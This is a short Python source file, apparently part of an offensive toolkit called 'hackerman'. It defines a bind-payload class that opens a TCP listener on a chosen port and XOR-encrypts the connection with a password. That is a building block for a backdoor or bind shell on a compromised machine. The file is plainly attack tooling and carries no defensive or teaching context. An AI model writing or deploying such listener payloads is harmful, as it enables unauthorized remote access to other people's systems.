from hackerman.payloads.bind import base as payload
from hackerman.transport import tcp
from hackerman.crypto import xor

class Payload(payload.BasePayload):
	def __init__(self, port, password):
		conn = tcp.Server(port)
		crypt = xor.XORCrypt(password)
		super().__init__(conn, crypt)